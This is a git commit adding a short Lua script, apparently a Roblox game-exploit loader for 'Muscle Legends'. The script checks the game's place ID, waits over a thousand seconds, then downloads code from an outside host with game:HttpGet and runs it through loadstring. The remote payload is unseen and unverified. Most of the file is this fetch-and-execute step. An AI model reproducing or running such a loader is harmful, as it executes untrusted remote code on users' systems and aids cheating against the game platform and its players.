d55d87debd41ec8cfa281f49bdd7b94ee0e60adf
ttvkaiser <vaeros694@gmail.com>
2025-07-19 18:35:09 -0600

    Create .lua

---
+++ Muscle-Legends/.lua
@@ -0,0 +1,10 @@
+local allowedPlaceId = 3623096087
+
+if game.PlaceId == allowedPlaceId then
+	print("Script loading")
+  wait(1003.2)
+  loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/9410453d82aa9e02"))()
+  
+else		
+    warn("Game is not registered so it's not allowed in this game.")
+end
